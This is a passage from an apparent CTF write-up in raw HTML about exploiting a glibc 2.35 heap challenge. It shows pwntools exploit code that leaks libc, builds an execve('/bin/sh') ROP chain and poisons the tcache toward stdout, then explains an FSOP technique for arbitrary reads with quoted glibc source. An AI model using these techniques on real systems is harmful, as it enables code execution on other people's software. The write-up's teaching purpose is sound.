<span class="n">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="c1"># free(prev) =&gt; merged with a</span>

<span class="c1"># leak libc</span>
<span class="n">view</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span> <span class="c1"># - 0x1bebe0 # offset of the unsorted bin</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="n">binsh</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x221200</span>
<span class="n">stdout</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x21a780</span>

<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;environ: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stdout: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stdout</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># pop a chunk from the tcache to let an entry left to a </span>
<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># free(a) =&gt; tcache</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;T&#34;</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">((</span><span class="n">stdout</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xb20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))),</span> <span class="mh">0x130</span><span class="p">)</span> 
<span class="c1"># 0x130, too big for tcache =&gt; unsortedbin UAF on a to replace a-&gt;next with the address of the target location (stdout) </span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;TT&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="c1"># pop a from tcache</span>

<span class="c1"># next 0x100 request will return the target location (stdout)</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x55c4fbcd7a00:	0x0000000000000000	0x0000000000000141 [prev]
</span><span class="s2">0x55c4fbcd7a10:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a20:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a30:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a40:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a50:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a60:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a70:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a80:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a90:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7aa0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7ab0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7ac0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7ad0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7ae0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7af0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7b00:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7b10:	0x5454545454545454	0x0000000000000111 [a]
</span><span class="s2">0x55c4fbcd7b20:	0x00007f5d45ff5b57	0x4f60331b73b9000a
</span><span class="s2">0x55c4fbcd7b30:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7b40:	0x0000000000000000	0x00000000000000e1 [unsortedbin]
</span><span class="s2">0x55c4fbcd7b50:	0x00007f5819b0dce0	0x00007f5819b0dce0
</span><span class="s2">0x55c4fbcd7b60:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7b70:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7b80:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7b90:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7ba0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7bb0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7bc0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7bd0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7be0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7bf0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7c00:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7c10:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7c20:	0x00000000000000e0	0x0000000000000020
</span><span class="s2">0x55c4fbcd7c30:	0x0068732f6e69622f	0x000000000000000a
</span><span class="s2">0x55c4fbcd7c40:	0x0000000000000000	0x00000000000203c1 [top chunk]
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="fsop-on-stdout-to-leak-environ">
        FSOP on stdout to leak environ
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#fsop-on-stdout-to-leak-environ" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor FSOP on stdout to leak environ" href="#fsop-on-stdout-to-leak-environ">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>I didn&rsquo;t see first that only <code>PARTIAL RELRO</code> was enabled on the libc, so the technique I show you here was thought to face a <code>2.35</code> libc with <code>FULL RELRO</code> enabled that the reason why I didn&rsquo;t just hiijack some GOT pointers within the libc.</p>
<p>A pretty convenient way to gain code execution when the hooks (<code>__malloc_hook</code>, <code>__free_hook</code>) are not present (since <code>2.32</code> cf <a
  class="gblog-markdown__link"
  href="https://sourceware.org/pipermail/libc-alpha/2021-August/129718.html"
  
  >this for 2.34</a
>) is to leak the address of the stack to then write a ROPchain on it. To leak a stack address we can make use of the <code>environ</code> symbol stored in the dynamic linker, it contains a pointer toward <code>**envp</code>.</p>
<p>To read this pointer we need a read what where primitive! Which can be achieved through a file stream oriented programming (FSOP) attack on <code>stdout</code> for example. To dig more FSOP I advise you to read <a
  class="gblog-markdown__link"
  href="https://nasm.re/posts/onceforall/"
  
  >this write-up</a
> as well as <a
  class="gblog-markdown__link"
  href="https://nasm.re/posts/bookwriter/"
  
  >this one</a
>.</p>
<p>To understand the whole process I&rsquo;ll try to introduce you to FSOP. First of all the target structure is stdout, we wanna corrupt stdout because it&rsquo;s used ritght after the <code>fgets</code> that reads the input from the user by the <code>putchar</code> function. Basically on linux &ldquo;everything is a file&rdquo; from the character device the any stream (error, input, output, opened file) we can interact with  a resource just by opening it and by getting a file descriptor on it, right ? This way each file descripor has an associated structure called <code>FILE</code> you may have used if you have already done some stuff with files on linux. Here is its definition:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L49
</span><span class="c1"></span><span class="cm">/* The tag name of this struct is _IO_FILE to preserve historic
</span><span class="cm">   C++ mangled names for functions taking FILE* arguments.
</span><span class="cm">   That name should not be used in new code.  */</span>
<span class="k">struct</span> <span class="n">_IO_FILE</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>

  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>

  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
  <span class="n">__off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it&#39;s too small.  */</span>

  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span><span class="cp"></span><span class="p">};</span>

<span class="k">struct</span> <span class="n">_IO_FILE_complete</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="n">_file</span><span class="p">;</span>
<span class="cp">#endif
</span><span class="cp"></span>  <span class="n">__off64_t</span> <span class="n">_offset</span><span class="p">;</span>
  <span class="cm">/* Wide character stream stuff.  */</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">_codecvt</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="o">*</span><span class="n">_wide_data</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_freeres_list</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">_freeres_buf</span><span class="p">;</span>
  <span class="n">size_t</span> <span class="n">__pad5</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_mode</span><span class="p">;</span>
  <span class="cm">/* Make sure we don&#39;t get into trouble again.  */</span>
  <span class="kt">char</span> <span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)];</span>
<span class="p">};</span>
</code></pre></div><p>Here are brievly role of each fields:</p>
<ul>
<li><code>_flags</code> stands for the behaviour of the stream when a file operation occurs.</li>
<li><code>_IO_read_ptr</code> address of input within the input buffer that has been already used.</li>
<li><code>_IO_read_end</code> end address of the input buffer.</li>
<li><code>_IO_read_base</code> base address of the input buffer.</li>
<li><code>_IO_write_base</code> base address of the ouput buffer.</li>
<li><code>_IO_write_ptr</code> points to the character that hasn&rsquo;t been printed yet.</li>
<li><code>_IO_write_end</code> end address of the output buffer.</li>
<li><code>_IO_buf_base</code> base address for both input and output buffer.</li>
<li><code>_IO_buf_end</code> end address for both input and output buffer.</li>
<li><code>_chain</code> stands for the single linked list that links of all file streams.</li>
<li><code>_fileno</code> stands for the file descriptor associated to the file.</li>
<li><code>_vtable_offset</code> stands for the offset of the vtable we have to use.</li>
<li><code>_offset</code> stands for the current offset within the file.</li>
</ul>
<p>Relatable flags:</p>
<ul>
<li><code>_IO_USER_BUF</code> During line buffered output, _IO_write_base==base() &amp;&amp; epptr()==base(). However, ptr() may be anywhere between base() and ebuf(). This forces a call to filebuf::overflow(int C) on every put. If there is more space in the buffer, and C is not a &lsquo;\n&rsquo;, then C is inserted, and pptr() incremented.</li>
<li><code>_IO_MAGIC</code> Magic number of <code>fp-&gt;_flags</code>.</li>
<li><code>_IO_UNBUFFERED</code> If a filebuf is unbuffered(), the _shortbuf[1] is used as the buffer.</li>
<li><code>_IO_LINKED</code> In the list of all open files.</li>
</ul>
<p>To understand I advise you to read this <a
  class="gblog-markdown__link"
  href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write"
  
  >great article</a
> about FILE structures. What we gonna do right now is trying to understand the use of <code>stdout</code> during within the <code>putchar</code> function. And we will try to find a code path that will not write the provided argument (in this case the <code>\n</code> taken by <code>putchar</code>) into the output buffer we control but rather flush the file stream to directly print its content and then print the provided argument. This way we could get an arbitrary read by controlling the output buffer.
Let&rsquo;s take a closer look at the <code> __putc_unlocked_body</code> macro:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
<span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L106
</span><span class="c1"></span><span class="cp">#define __putc_unlocked_body(_ch, _fp)					\
</span><span class="cp">  (__glibc_unlikely ((_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end)	\
</span><span class="cp">   ? __overflow (_fp, (unsigned char) (_ch))				\
</span><span class="cp">   : (unsigned char) (*(_fp)-&gt;_IO_write_ptr++ = (_ch)))
</span><span class="cp"></span>
</code></pre></div><p>It ends up calling <code>__overflow</code> if there is no more space in the output buffer (<code>(_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end)</code>). That&rsquo;s basically the code path we need to trigger to call <code>__overflow</code> instead of just write the provided char into the output buffer.
So first condition:</p>
<ul>
<li><code>(_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L198
</span><span class="c1"></span><span class="kt">int</span>
<span class="nf">__overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* This is a single-byte stream.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">_IO_fwide</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">ch</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Given the file stream isn&rsquo;t oriented (byte granularity) we directly reach the <code>_IO_OVERFLOW</code> call, now the final goal to get a leak is to reach the <code>_IO_do_write</code> call:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L730
</span><span class="c1"></span>
<span class="kt">int</span>
<span class="nf">_IO_new_file_overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span> <span class="cm">/* SET ERROR */</span>
    <span class="p">{</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="cm">/* If currently reading or no buffer allocated. */</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Allocate a buffer if needed. */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">f</span><span class="p">);</span>
	  <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
	<span class="p">}</span>
      <span class="cm">/* Otherwise must be currently reading.
</span><span class="cm">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
</span><span class="cm">	 logically slide the buffer forwards one block (by setting the
</span><span class="cm">	 read pointers to all point at the beginning of the block).  This
</span><span class="cm">	 makes room for subsequent output.
</span><span class="cm">	 Otherwise, set the read pointers to _IO_read_end (leaving that
</span><span class="cm">	 alone, so it can continue to correspond to the external position). */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">_IO_in_backup</span> <span class="p">(</span><span class="n">f</span><span class="p">)))</span>
	<span class="p">{</span>
	  <span class="n">size_t</span> <span class="n">nbackup</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
	  <span class="n">_IO_free_backup_area</span> <span class="p">(</span><span class="n">f</span><span class="p">);</span>
	  <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">-=</span> <span class="n">MIN</span> <span class="p">(</span><span class="n">nbackup</span><span class="p">,</span>
				   <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
	  <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">==</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">)</span>
	    <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>

      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span> <span class="o">|</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
	<span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
			 <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">==</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="p">)</span> <span class="cm">/* Buffer is really full */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_do_flush</span> <span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
  <span class="o">*</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="o">++</span> <span class="o">=</span> <span class="n">ch</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_UNBUFFERED</span><span class="p">)</span>
      <span class="o">||</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_LINE_BUF</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">ch</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">))</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
		      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">ch</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">)</span>

</code></pre></div><p>Given <code>ch</code> is <code>\n</code>, to trigger the <code>_IO_do_flush</code> call which will flush the file stream we have to:</p>
<ul>
<li>Remove <code>_IO_NO_WRITES</code> from <code>fp-&gt;_flags</code> to avoid the first condition.</li>
<li>Add <code>_IO_CURRENTLY_PUTTING</code> to <code>fp-&gt;_flags</code> and give a non <code>NULL</code> value to <code>f-&gt;_IO_write_base</code> to avoid the second condition (useless code).</li>
<li>make <code>f-&gt;_IO_write_ptr</code> equal to <code>f-&gt;_IO_buf_end</code> to then call <code>_IO_do_flush</code>.</li>
</ul>
<p>Now we reached <code>_IO_do_flush</code> which is basically just a macro:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
<span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/libioP.h#L507
</span><span class="c1"></span><span class="cp">#define _IO_do_flush(_f) \
</span><span class="cp">  ((_f)-&gt;_mode &lt;= 0							      \
</span><span class="cp">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \
</span><span class="cp">		  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)		      \
</span><span class="cp">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,		      \
</span><span class="cp">		   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr			      \
</span><span class="cp">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))
</span><span class="cp"></span>
</code></pre></div><p>Given <code>stdout</code> is byte-oriented <code>_IO_new_do_write</code> is called:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
<span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L418
</span><span class="c1"></span><span class="k">static</span> <span class="n">size_t</span> <span class="nf">new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="n">size_t</span><span class="p">);</span>

<span class="cm">/* Write TO_DO bytes from DATA to FP.
</span><span class="cm">   Then mark FP as having empty buffers. */</span>

<span class="kt">int</span>
<span class="nf">_IO_new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">to_do</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="p">(</span><span class="n">to_do</span> <span class="o">==</span> <span class="mi">0</span>
